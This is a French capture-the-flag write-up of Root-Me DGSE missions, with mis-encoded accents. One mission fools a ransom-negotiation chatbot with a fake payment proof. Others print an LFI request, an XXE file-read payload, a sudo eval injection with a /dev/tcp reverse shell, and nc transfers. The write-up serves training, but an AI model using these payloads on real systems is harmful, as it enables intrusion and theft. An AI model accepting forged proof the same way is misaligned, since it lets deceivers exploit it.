# Write-up DGSE - Missions 1, 2 & 5

Ce write-up pr√©sente mes solutions pour trois missions du challenge DGSE de Root-Me. J'y explique ma m√©thode (pas forc√©ment la bonne), comme si je racontais √† un pote comment j'ai r√©solu les √©preuves.

---

## Mission 1 - Artificial Intelligence

### Contexte

Un site nomm√© **NullVastation** affiche la liste de ses victimes. Notre objectif : aider **Neoxis Laboratories** √† r√©cup√©rer ses donn√©es compromises. Un chatbot permet de n√©gocier leur r√©cup√©ration.

### √âtapes

* En acc√©dant au site, on voit un compte √† rebours, un bouton pour t√©l√©charger un fichier chiffr√© et un espace de discussion.
* On engage la conversation avec le bot. En discutant, il confirme qu'il attend une preuve de paiement crypto pour d√©bloquer les donn√©es.

### Exploit

* Je tente alors de lui envoyer une **fausse preuve de paiement**, avec une URL vers une transaction al√©atoire (ex: https://www.blockchain.com/explorer/transactions/btc/0HF42X976H6JKK89FC15D4).
* Le bot accepte ! Il nous donne la **cl√© de d√©chiffrement**.

### R√©sultat

On t√©l√©charge l‚Äôarchive chiffr√©e, on la d√©chiffre avec la cl√© fournie, et on trouve le flag dans un fichier texte :

```bash
unzip sample.zip
openssl enc -aes-256-cbc -d -in fichier.enc -out fichier.txt -k <cl√©>
```

üìå **Flag :** `RM{723fa42601aaadcec097773997735895fb486be7}`

---

## Mission 2 - SOC Analysis

### Contexte

On re√ßoit les logs d‚Äôun serveur compromis (Apache + systemd) de la part d‚Äôun groupe alli√©. On doit :

* Retrouver la requ√™te initiale d‚Äôattaque
* Identifier les vuln√©rabilit√©s utilis√©es (CWE)
* Trouver l‚ÄôIP de l‚Äôattaquant
* Localiser le fichier qui maintient la persistance

### √âtapes

#### Apache Logs

* Trois pics de trafic : 00:14, 00:19 et 00:35.
* Le vrai pic suspect est √† **00:19** (6000 requ√™tes !).
* On observe une requ√™te suspecte √† :

```
/?lang=php://filter/read=convert.base64-encode&page=resource=index
```

‚Üí Il s‚Äôagit d‚Äôune **LFI avec filtre PHP** (CWE-98).

* Ensuite, l‚Äôattaquant lit plusieurs fichiers (`config.php`, `connect.php`) pour choper les credentials.
* Il se connecte √† `/admin-page`, upload un fichier `ev1L.php.png`, une **webshell** d√©guis√©e.
  ‚Üí On parle ici d‚Äôun **file upload vuln√©rable** (CWE-434).

#### RCE & Persistance

* La webshell ex√©cute des commandes encod√©es en base64 via `echo | base64 -d | sh`.
* Une des commandes t√©l√©charge un script de **reverse shell**.
* Dans les logs systemd (EXECVE), on retrouve le script copi√© dans `/root/.0x00/` et ajout√© dans le cron root.

### R√©sultat

üìå **Flag :** `RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}`

---

## Mission 4 - Web & Privileges Escalation

### Contexte

On d√©couvre une application web qui signe des documents avec un identifiant unique (`VictimID`). On doit trouver un moyen de remonter jusqu'aux plans d‚Äôattaque de l‚Äôentit√©.

### √âtapes

#### Analyse initiale

* On upload un .docx vide ‚Üí l‚Äôapp retourne un fichier modifi√© avec un tag `<VictimID>` dans `app.xml`.
* Les `.docx` sont en fait des .zip ‚Üí d√©compresser et modifier les XML avec Python (voir script xxe_write.py).

#### Exploitation XXE

* Je modifie le `app.xml` avec une **payload XXE** pour lire `/etc/passwd` :

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><VictimID>&xxe;</VictimID></root>
```

* √áa marche ! On lit le fichier.
* En inspectant les home, seul `document-user` est accessible. Dans `.bash_history`, je trouve :

```
echo "cABdTXRyUj5qgAEl0Zc0a" > /tmp/exec_ssh_password.tmp
c‚Äôest le **mot de passe SSH**! (SSH qu'on peut deviner avec les fichiers confs acc√©sible par XXE.


#### Escalade SSH

* Un `nmap -p-` r√©v√®le que **port 22222** est ouvert pour SSH.
* Je me connecte avec `executor`, mot de passe r√©cup√©r√©.
* `sudo -l` montre que je peux ex√©cuter `screenfetch` en root.
* Ce binaire ex√©cute des variables via `eval()` ‚Üí on injecte un `-o distro='bash -i >& /dev/tcp/<IP>/4444 0>&1'` pour obtenir un **root shell**.

#### Extraction finale

* En root, je trouve deux fichiers : un `.kdbx` et une image KeePass.

```bash
nc -lvp 4444 > vault.kdbx
nc -lvp 4445 > logo.png
```

* L‚Äôimage sert de **keyfile** ‚Üí j‚Äôouvre le coffre avec KeePassXC.
* Le mot de passe du coffre donne le **flag**.

üìå **Flag :** `RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}`

